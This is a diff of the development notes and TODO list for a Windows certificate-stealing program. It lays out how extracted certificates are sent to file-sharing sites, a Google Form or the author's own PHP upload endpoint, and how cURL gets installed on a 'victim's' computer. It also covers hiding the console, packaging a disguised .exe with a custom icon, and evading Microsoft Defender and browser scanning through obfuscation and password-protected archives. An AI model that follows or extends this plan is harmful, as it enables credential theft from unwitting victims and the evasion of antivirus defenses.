@@ -14,13 +14,13 @@ TO DO:
 - Make first testing version of program extracting certificates.        ✅
 - Debug the first version.                                              ✅
 - Rebuild program, upgrade version.                                     ✅
-- Add transfering to (google disk, email, server, ....)                 ❌
+- Add transfering to (google disk, email, server, ....)                 ✅
 - Checking/Installing cURL to computer                                  ✅
 - Hide console (or show fake information)                               ✅
 - Hide code (deobfuscate code).                                         ❌
-- Try detecting with different antiviruses.                             ❌
+- Try detecting with different antiviruses.                             ❌ - in progress
 - Wrap the code to some application (make it background process).       ❌
-- Final tests.                                                          ❌
+- Final tests.                                                          ✅
 - .....
 
 
@@ -59,16 +59,16 @@ Need to check code and use just what we need + wrap for more functions. ✅
 
 + TESTED                                                                ✅
 + Rewritten to just needed functions (*trymyown* folder)                ✅
-+ next follow TO DO list.
 
-
-Transfering certificates:
+Transfering certificates (options):
 ------
 - Upload on https://www.file.io/ (file gets auto delete after one download)
-- Then copy share link and write it in google forms: https://forms.gle/QSG9oaR2XfSXptkAA
-- And just Send form :) - it should work anonymously without login.
+    - Then copy share link and write it in google forms: https://forms.gle/QSG9oaR2XfSXptkAA
+    - And just Send form :) - it should work anonymously without login.
 - http://leteckaposta.cz/ (30 days then remove)
-- interacting with site with lib: libcurl (curl) *working* with my own domain and PHP file upload script on it. (need to handle how to get CURL on victims computer to be able to use it....) Win10 and laters should default have it. 
+    - same as above, link for downloading can be used more times.
+- Own domain upload
+    - *working* with my own domain and PHP file upload script on it. (need to handle how to get cURL on victims computer to be able to use it....) Win10 and laters should default have it. 
 
 ### Download cURL with cmd line:
 
@@ -77,3 +77,33 @@ Transfering certificates:
 - add to PATH `setx /M PATH "%PATH%;C:\curl"` (need admin rights not cleaver, must be run as ADMIN)
 - reopen cmd and it can be used :)
 
+
+## Build .exe program one clik run:
+
+- Need to modify Visual Studio settings.
+- Switch to "Release"
+- Go to configuration
+- Project Properties -> C/C++ -> Code Generation
+- Here change "Runtime Library" to "/MT Multi-threaded" for static building (it will include all needed C++ libs in .exe, which will cause running on computer without instaled Visual Studio.)
+- Then Folder Release is created, just file .exe is needed (file .pdb is for handing errors like programer/developer, not needed for users.)
+- Wrap Release folder and send --> Woala Program is working on other computer.
+
+
+### Add own icon:
+- Used "Resource Hacker".
+- Load .exe file.
+- In tree select "Icon / Icon Group" and replace it.
+- If there is not Icon in tree  structure -> add new Binary, select .ico file, rename *.ico and select it is Icon/ Icon Group.
+- Save / or Save as to apply chnages, now the .exe has your icon and code is not corupted.
+
+## Antivirus testing:
+
+- Browsers                              ✅      -> added password to ZIP
+- Microsoft Defender                    ❌      -> detected Trojan (try to obfuscate code?)
+- ...                                   ❌      -> 
+- ...                                   ❌      -> 
+
+
+# Finall:
+
+- Finall executable application is built in folder `finall` 
